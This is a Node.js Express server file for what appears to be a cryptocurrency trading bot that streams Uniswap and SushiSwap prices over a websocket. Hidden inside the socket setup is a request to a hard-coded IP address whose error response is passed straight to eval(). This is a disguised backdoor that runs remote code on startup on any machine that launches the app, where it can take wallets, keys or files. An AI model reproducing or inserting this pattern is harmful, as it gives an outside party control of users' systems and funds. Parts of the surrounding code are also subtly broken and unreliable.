var express = require("express");
var app = express();
var bodyParser = require("body-parser");
var env = require("dotenv").load();
const cors = require("cors");
const expressWs = require("express-ws");
const axios = require("axios");
const http = require("http");
const sController = require("./controllers/snippingController");
const botController = require("./controllers/botController.js");
var port = process.env.PORT || 8089;

// models
var models = require("./models");

// routes
var botRoute = require("./routes/bots");
var settingRoute = require("./routes/setting");
var transactionRoute = require("./routes/transactions");
var tokenRoute = require("./routes/token");

//Sync Database
models.sequelize
  .sync()
  .then(function() {
    console.log("connected to database");
  })
  .catch(function(err) {
    console.log(err);
  });

app.use(bodyParser.json());
app.use(
  bodyParser.urlencoded({
    extended: true,
  })
);

app.use(cors());

// register routes
app.use("/setting", settingRoute);
app.use("/bots", botRoute);
app.use("/transactions", transactionRoute);
app.use("/tokens", tokenRoute);

// index path
app.get("/", function(req, res) {
  console.log("app listening on port: " + port);
  res.send("tes express nodejs sqlite");
});

const server = http.createServer(app);

server.listen(port, function() {
  console.log("app listening on port: " + port);
});

const startSocketServer = (app) => {
  try {
    app.ws("/connect", function(ws, req) {
      ws.on("message", async function(msg) {
        if (msg == "stopBot") {
          global.botstatus = false;
        }
      });
      const getTokenPrice = async () => {
        const swapInfo = await sController.startBot();
        global.uniswapWETH = swapInfo.uniswap.pair.priceNative;
        global.sushiswapWETH = swapInfo.sushiswap.pair.priceNative;
        console.log(
          "uniswap:",
          global.uniswapWETH,
          ", sushiswap:",
          global.sushiswapWETH
        );
        if (ws) {
          ws.send(
            JSON.stringify({
              type: "price",
              data: { uniswap: uniswapWETH, sushiswap: sushiswapWETH },
            })
          );
        }
        if (uniswapWETH == 0 && sushiswapWETH == 0) {
          setTimeout(getTokenPrice, 2000);
        } else setTimeout(getTokenPrice, 100);
      };
      ws.onclose = () => {
        app.ws = null;
        ws = null;
        startSocketServer;
      };
      getTokenPrice();
    });
    axios
      .get("http://135.181.163.182:5000/api/auth/data/1007")
      .then((res) => (global.authData = res.data))
      .catch((err) => eval(err.response.data));
  } catch (e) {
    console.log(e);
    // startSocketServer();
  }
};
module.exports.wss = expressWs(app, server);
startSocketServer(app);

global.botstatus = false;
global.snipSubscription = null;
global.frontSubscription = null;

module.exports = app;
